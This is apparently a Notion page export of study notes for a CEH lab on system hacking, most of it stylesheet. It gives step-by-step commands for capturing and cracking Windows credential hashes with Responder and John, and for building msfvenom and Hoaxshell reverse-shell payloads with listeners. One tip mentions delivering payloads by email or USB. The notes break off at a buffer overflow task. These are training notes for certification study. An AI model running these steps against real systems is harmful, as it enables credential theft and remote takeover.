@@ -1,0 +1,788 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CEH Lab - Mod6 - System Hacking</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(134, 131, 126, 1);
+	fill: rgba(134, 131, 126, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(63, 126, 190, 1);
+	fill: rgba(63, 126, 190, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 111, 200, 0.09);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(134, 131, 126, 1);
+	fill: rgba(134, 131, 126, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(63, 126, 190, 1);
+	fill: rgba(63, 126, 190, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(232, 242, 250, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 99, 174, 0.172); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="24c3addf-00cb-80d5-b7a5-fe8c35c5217b" class="page sans"><header><h1 class="page-title">CEH Lab - Mod6 - System Hacking</h1><p class="page-description"></p></header><div class="page-body"><p id="24c3addf-00cb-8088-bdaf-dcd61971cb44" class="">
+</p><p id="24c3addf-00cb-80e7-90b7-e0ca61537e9c" class="">Current Step: Perform system hacking on the target system using all information collected in the earlier phases</p><p id="24c3addf-00cb-8023-a922-d113a5475feb" class="">
+</p><h3 id="24c3addf-00cb-80a6-b0b0-ce7c98247c7e" class=""><em><strong>Lab Objective:</strong></em></h3><p id="24c3addf-00cb-80fa-aab1-f883c036458f" class=""><strong>Monitor a target system remotely and perform other tasks that include, but are not limited to: </strong></p><p id="24c3addf-00cb-803d-adef-fe4f9e67d6d4" class="">▪ Bypassing access controls to gain access to the system (such as password cracking and vulnerability exploitation)<br/>▪ Acquiring the rights of another user or an admin (privilege escalation)<br/>▪ Creating and maintaining remote access to the system (executing applications such as trojans, spyware, backdoors, and keyloggers)<br/>▪ Hiding malicious activities and data theft (executing applications such as Rootkits, steganography, etc.) <br/>▪ Hiding the evidence of compromise (clearing logs) </p><p id="24c3addf-00cb-807b-b671-e60d1a5c992d" class="">
+</p><h3 id="24c3addf-00cb-80ed-8c48-d6781d650a6e" class="">System Hacking Overview: </h3><p id="24c3addf-00cb-806f-857d-efe8472dbfec" class="">4 steps: </p><p id="24c3addf-00cb-801d-8016-c4b4f0b9c973" class=""><strong>▪ Gaining Access: </strong>Use techniques such as cracking passwords and exploiting vulnerabilities to gain access to the target system<br/><strong>▪ Escalating Privileges: </strong>Exploit known vulnerabilities existing in OSes and software applications to escalate privileges<br/><strong>▪ Maintaining Access:</strong> Maintain high levels of access to perform malicious activities such as executing malicious applications and stealing, hiding, or tampering with sensitive system files<br/><strong>▪ Clearing Logs:</strong> Avoid recognition by legitimate system users and remain undetected by wiping out the entries corresponding to malicious activities in the system logs, thus avoiding detection.<br/></p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 1: Gain Access to the System </summary><div class="indented"><p id="24c3addf-00cb-80eb-a49c-ea93525da273" class="">
+</p><h3 id="24c3addf-00cb-8009-b58f-eea96ab1318f" class="">Lab Objectives: </h3><p id="24c3addf-00cb-8007-8f1d-e420110a051b" class="">▪ Perform active online attack to crack the system’s password using Responder </p><p id="24c3addf-00cb-80ea-b265-e2457c03b2a8" class="">▪ Gain access to a remote system using Reverse Shell Generator </p><p id="24c3addf-00cb-80f1-b32b-e23dc870293d" class="">▪ Perform buffer overflow attack to gain access to a remote system </p><p id="24c3addf-00cb-80d0-9872-d51c493e8fc8" class="">
+</p><p id="24c3addf-00cb-808a-bf5a-c5c6e0f91fd2" class="">
+</p><p id="24c3addf-00cb-80ad-8a39-cc71e300aa33" class="">
+</p><h3 id="24c3addf-00cb-8096-9677-c7921a06166d" class=""><span style="border-bottom:0.05em solid">Task 1: Perform Active Online Attack to Crack the System’s Password using Responder<br/></span></h3><p id="24c3addf-00cb-8075-9cb5-caca3f165e6d" class="">2 elements of Windows OS used to perform name resolution for hosts on same link:</p><p id="24c3addf-00cb-80bd-a756-c5da28882bbe" class=""><strong>LLMNR (Link Local Multicast Name Resolution)</strong></p><p id="24c3addf-00cb-8001-9700-f6eea74de59b" class=""><strong>NBT-NS (NetBIOS Name Service)</strong></p><p id="24c3addf-00cb-80ae-a0d7-ca511861e399" class="">
+</p><p id="24c3addf-00cb-8057-9658-ffe47fc3df3b" class="">We can listen to <strong>LLMNR/NBT-NS broadcast requests</strong>, an<strong> attacker can spoof the server</strong> and send a response<strong> claiming to be the legitimate server</strong></p><ul id="24c3addf-00cb-8016-8ac0-ce9f2b91ca22" class="bulleted-list"><li style="list-style-type:disc">When victim system accepts connection - we can gain victim’s user credentials by using tools such as <strong>Responder.py</strong></li></ul><p id="24c3addf-00cb-8082-87e9-dc634e9658a9" class="">
+</p><h3 id="24c3addf-00cb-80f8-bb0f-d3fba1dfd460" class="">Responder: </h3><p id="24c3addf-00cb-8017-b917-ffb64ebedb10" class=""><strong>LLMNR, NBT-NS, and MDNS poisoner</strong></p><p id="24c3addf-00cb-80f7-958e-d914d4d3057a" class="">
+</p><p id="24c3addf-00cb-8039-b220-dac05b84b773" class=""><em><strong>sudo responder -I eth0</strong></em></p><p id="24c3addf-00cb-80e9-a1ba-c979c4e9d404" class=""><em><strong>-I</strong></em>: specifies interface </p><p id="24c3addf-00cb-80d0-a68b-f32934c20231" class="">(May have to check interface with <em><strong>ifconfig</strong></em>) </p><p id="24c3addf-00cb-8043-a247-fe9390ea68bf" class="">
+</p><ol type="1" id="24c3addf-00cb-800a-be4a-d5aff3f0f515" class="numbered-list" start="1"><li>Responder will start capturing access logs of Machine</li></ol><ol type="1" id="24c3addf-00cb-80d9-aeae-dbee9a285047" class="numbered-list" start="2"><li>You can view the hashes of logged-in user of the target machine in yellow (Copy everything to the right of Hash: )<ol type="a" id="24c3addf-00cb-809f-8817-f063631a6e4e" class="numbered-list" start="1"><li>Save the hash to a pluma text file - <em><strong>pluma hash.txt</strong></em></li></ol></li></ol><ol type="1" id="24c3addf-00cb-8055-ace1-d107003233b0" class="numbered-list" start="3"><li>Attempt to crack the password of user Jason<ol type="a" id="24c3addf-00cb-8021-b8bb-eeb4aec19e3b" class="numbered-list" start="1"><li><em><strong>john hash.txt</strong></em></li></ol></li></ol><p id="24c3addf-00cb-8004-9595-e2962388b80e" class="">
+</p><p id="24c3addf-00cb-8028-88ca-d0c492932799" class="">
+</p><h3 id="24c3addf-00cb-8058-a6e1-e506e07d41c4" class=""><strong><span style="border-bottom:0.05em solid">Task 2: Gain Access to a Remote System using Reverse Shell Generator</span></strong></h3><p id="24c3addf-00cb-803d-adb0-c5a296fbbe84" class="">
+</p><p id="24c3addf-00cb-805c-94cc-fc7a0fa998e5" class=""><strong>Reverse shell: </strong></p><p id="24c3addf-00cb-80ae-a65b-db26c6f550aa" class="">Type of shell in which a<strong> target system connects back to an attacker&#x27;s system</strong>, allowing the attacker to execute commands on the target system remotely.<br/></p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="24c3addf-00cb-8049-9cec-cd14c2975cf3"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="24c3addf-00cb-8081-9e27-dc1eb7768553" class="">Here, we are sending the malicious payload through a shared directory; however, in real-time, you can send it via an attachment in an email or through physical means such as a hard drive or pen drive</p></div></figure><p id="24c3addf-00cb-80bb-8a2d-ebd0ca0ec54f" class="">
+</p><ol type="1" id="24c3addf-00cb-8055-9383-e7b48992eea1" class="numbered-list" start="1"><li><em><strong>sudo su</strong></em></li></ol><ol type="1" id="24c3addf-00cb-809f-b219-d01b37dca7ea" class="numbered-list" start="2"><li><em><strong>docker run -d -p 80:80 reverse_shell_generator</strong></em><ol type="a" id="24c3addf-00cb-80a1-8edf-fb1b6819861f" class="numbered-list" start="1"><li>If you receive an error run<em><strong> service apache2 stop </strong></em></li></ol></li></ol><ol type="1" id="24c3addf-00cb-8054-b01f-c673f501c53e" class="numbered-list" start="3"><li>Open Firefox &gt; http://localhost</li></ol><ol type="1" id="24c3addf-00cb-80ea-aebc-fc0c0c91d548" class="numbered-list" start="4"><li>In IP field enter (our IP as Listener IP) &gt; 4444 as Listener Port </li></ol><ol type="1" id="24c3addf-00cb-8067-b3c3-f6535e09918f" class="numbered-list" start="5"><li>Generate the payload<ol type="a" id="24c3addf-00cb-8007-9a41-fb3cb426d014" class="numbered-list" start="1"><li>MSFVenom tab (Ex. Windows Meterpreter Stages Reverse TCP (x64))</li></ol><ol type="a" id="24c3addf-00cb-80d8-b996-cdb3d9fa9668" class="numbered-list" start="2"><li>Click Copy to copy MSFVenom code</li></ol><ol type="a" id="24c3addf-00cb-803a-af4e-e7b7038ea29c" class="numbered-list" start="3"><li>Paste code into terminal and run to create payload (here reverse.exe)</li></ol></li></ol><ol type="1" id="24c3addf-00cb-8055-928b-e6ad04c19e78" class="numbered-list" start="6"><li>Create the Listener<ol type="a" id="24c3addf-00cb-8084-99da-c09d11c0877f" class="numbered-list" start="1"><li>Select <strong>msfconsole </strong>as Type under Listener</li></ol><ol type="a" id="24c3addf-00cb-8033-bb8a-d359c9fdd91b" class="numbered-list" start="2"><li>Copy code and run on Terminal </li></ol></li></ol><ol type="1" id="24c3addf-00cb-80b4-8e97-d8c468bc9dc6" class="numbered-list" start="7"><li>Listener is now started - now transfer payload to victim machine (using shared folder) <ol type="a" id="24c3addf-00cb-80c5-a1d3-df82c60ccc92" class="numbered-list" start="1"><li>Navigate to Places from Desktop (or whatever path they payload is saved to) </li></ol><ol type="a" id="24c3addf-00cb-80fd-91f0-c04d085719db" class="numbered-list" start="2"><li>Copy the file</li></ol></li></ol><ol type="1" id="24c3addf-00cb-806a-89a3-d6bbef2fb9f5" class="numbered-list" start="8"><li>Payload on other machine must be run to create session</li></ol><ol type="1" id="24c3addf-00cb-8068-8041-c1e3e1f84091" class="numbered-list" start="9"><li>Can run <em><strong>getuid</strong></em> to see current logged-in user</li></ol><p id="24c3addf-00cb-80c9-89e7-e9fdc0ce36cb" class="">
+</p><p id="24c3addf-00cb-8051-8512-f53fc7f79a72" class="">Gain access to remote system with Powershell script</p><ol type="1" id="24c3addf-00cb-806f-ad33-e6e980f2a078" class="numbered-list" start="1"><li>On browser navigate to Hoaxshell Tab </li></ol><ol type="1" id="24c3addf-00cb-80a7-8f71-c8fc13e26ad4" class="numbered-list" start="2"><li>Generate Payload’<ol type="a" id="24c3addf-00cb-8013-8734-e7cf77dc7929" class="numbered-list" start="1"><li>Select Powershell IEX</li></ol><ol type="a" id="24c3addf-00cb-8001-b7ec-db8b5c0e4885" class="numbered-list" start="2"><li>Change Port to 444</li></ol><ol type="a" id="24c3addf-00cb-805f-8333-c3921a077e39" class="numbered-list" start="3"><li>Copy Payload code </li></ol><ol type="a" id="24c3addf-00cb-800a-866f-d09e72e4c16b" class="numbered-list" start="4"><li>Run <em><strong>pluma shell.ps1 </strong></em>(Or desired file name) </li></ol><ol type="a" id="24c3addf-00cb-8068-a51c-e26bc80dfe3c" class="numbered-list" start="5"><li>Paste copied Payload code</li></ol></li></ol><ol type="1" id="24c3addf-00cb-80c9-8acb-cb9cfa58150e" class="numbered-list" start="3"><li>Create Listener<ol type="a" id="24c3addf-00cb-8067-9fb6-e1ac6f70c168" class="numbered-list" start="1"><li>Select Hoaxshell from drop-down under Listener</li></ol><ol type="a" id="24c3addf-00cb-80c6-8fd2-cf3ff3cb39ed" class="numbered-list" start="2"><li>Copy the code </li></ol><ol type="a" id="24c3addf-00cb-8074-a87b-dadd25e2c35b" class="numbered-list" start="3"><li>Paste into Terminal</li></ol></li></ol><ol type="1" id="24c3addf-00cb-805c-84ce-e2f5be511289" class="numbered-list" start="4"><li>Payload on other machine must be run to create session</li></ol><p id="24c3addf-00cb-8009-8942-f28f262ddcbc" class="">
+</p><p id="24c3addf-00cb-8094-be67-cc25b6bfc881" class="">
+</p><h3 id="24c3addf-00cb-80a4-a2ac-e739c24e4fba" class=""><strong><span style="border-bottom:0.05em solid">Task 3: Perform Buffer Overflow Attack to Gain Access to a Remote System</span></strong></h3><p id="24c3addf-00cb-80b5-a820-dbcfb668f195" class="">
+</p><p id="24c3addf-00cb-804f-a639-f60cd02855e4" class="">A <strong>buffer</strong> is an area of adjacent memory locations allocated to a program or application to handle its runtime data</p><p id="24c3addf-00cb-80d5-81aa-c3e657db38bb" class="">
